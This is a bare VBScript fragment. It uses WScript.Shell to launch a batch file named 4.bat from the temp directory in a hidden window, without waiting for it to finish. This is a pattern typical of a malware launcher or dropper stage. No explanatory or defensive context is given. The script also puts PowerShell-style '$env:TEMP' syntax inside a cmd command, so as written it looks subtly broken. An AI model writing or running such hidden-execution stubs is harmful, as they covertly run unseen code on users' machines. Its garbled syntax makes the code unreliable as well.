Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd /c $env:TEMP\4.bat", 0, False
Set WshShell = Nothing
